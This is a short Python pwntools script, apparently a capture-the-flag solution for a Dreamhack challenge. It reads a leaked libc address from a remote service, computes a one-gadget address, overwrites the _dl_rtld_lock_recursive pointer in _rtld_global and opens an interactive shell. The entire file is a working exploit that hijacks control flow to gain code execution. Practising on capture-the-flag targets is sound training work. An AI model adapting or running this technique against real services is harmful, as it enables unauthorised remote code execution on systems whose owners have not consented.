#!/usr/bin/env python2

from pwn import *
import re

#HOST = "127.0.0.1"
#PORT = 12345

HOST = "host1.dreamhack.games"
PORT = 11387

conn = remote(HOST, PORT)
libc_base = int(re.search("0[xX][0-9a-fA-F]+", conn.recv()).group(), 16) - 0x00000000003C5620

oneshot = libc_base + 0xf1147
_rtld_global = libc_base + 0x5f0040
_dl_rtld_lock_recursive = _rtld_global + 0xf08 
#_dl_load_lock = _rtld_global + 0x908

conn.sendline(str(_dl_rtld_lock_recursive))
conn.sendline(str(oneshot))
conn.interactive()

